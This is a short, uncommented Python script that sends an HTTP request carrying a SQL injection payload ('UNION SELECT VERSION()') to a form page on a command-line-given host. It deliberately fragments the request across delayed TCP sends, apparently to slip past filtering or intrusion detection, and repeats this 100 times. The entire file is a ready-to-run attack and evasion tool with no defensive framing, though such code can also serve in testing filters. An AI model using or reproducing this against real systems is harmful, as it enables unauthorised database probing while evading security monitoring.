import socket
import sys
import time

req1 = b"GET /form.php?q=1+UNION+SELE"
req2 = b"CT+"
req3 = f"VERSION%28%29 HTTP/1.1\r\nHost: {sys.argv[1]}\r\n\r\n".encode()

for i in range(100):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    sock.connect((sys.argv[1], 80))

    sock.send(req1)

    time.sleep(1)

    sock.send(req2)

    time.sleep(1)

    sock.send(req3)

    sock.recv(2048)

    sock.close()
